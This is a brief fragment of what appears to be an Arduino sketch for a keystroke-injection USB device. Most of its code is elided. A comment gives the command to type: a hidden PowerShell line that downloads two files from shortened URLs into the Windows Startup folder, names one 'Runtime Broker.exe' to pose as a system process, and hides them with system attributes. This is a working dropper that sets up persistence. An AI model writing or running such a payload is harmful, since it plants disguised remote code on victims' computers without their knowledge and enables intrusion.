...
void setup() {
  ...
  //type: powershell -windowstyle hidden -command "cd \"$env:AppData\Microsoft\Windows\Start Menu\Programs\Startup\";iwr 3.ly/acKvl -o \"Runtime Broker.exe\";iwr 3.ly/acKvu -o System.vbs";ATTRIB +H +S *.exe
